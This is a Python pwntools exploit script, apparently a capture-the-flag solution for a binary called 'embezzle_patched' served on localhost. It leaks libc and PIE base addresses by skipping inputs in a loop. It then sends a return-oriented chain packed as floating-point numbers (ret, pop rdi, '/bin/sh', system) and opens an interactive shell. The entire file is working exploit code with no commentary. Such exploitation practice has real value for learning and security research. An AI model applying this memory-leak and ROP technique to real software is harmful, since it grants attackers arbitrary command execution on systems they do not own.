from pwn import *
import struct
elf = context.binary = ELF("embezzle_patched")
libc = ELF("libc.so.6")

p = remote("localhost", 5000)
# p = process()

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'128')
for i in range(8):
    p.recvuntil(b'for ')
    p.sendline(b'-')
        
p.recvuntil(b'for ')
libcBase = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
print(f"Got libc base: {hex(libcBase)}")
p.sendline(b'-')

for i in range(164):
    p.recvuntil(b'for ')
    p.sendline(b'-')
p.recvuntil(b'for ')
pieBase = u64(p.recvline().strip().ljust(8, b'\x00')) - 4432
print(f"Got pie base: {hex(pieBase)}")
p.sendline(b'-')
p.sendline(b'-1')
p.sendline(b'-1')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'128')

for i in range(7):
    p.recvuntil(b'for ')
    p.sendline(b'-')

def packDouble(data: bytes):
    data = data[::-1]
    return str(struct.unpack(">d", data)[0]).encode()

payload = packDouble(pack(pieBase + 0x000000000000101a))
p.sendline(payload)
payload = packDouble(pack(libcBase + 0x000000000002a3e5))
p.sendline(payload)
payload = packDouble(pack(libcBase + next(libc.search(b'/bin/sh'))))
p.sendline(payload)
payload = packDouble(pack(libcBase + libc.symbols['system']))
p.sendline(payload)
p.sendline(b'-1')
p.sendline(b'3')
p.clean()
p.interactive()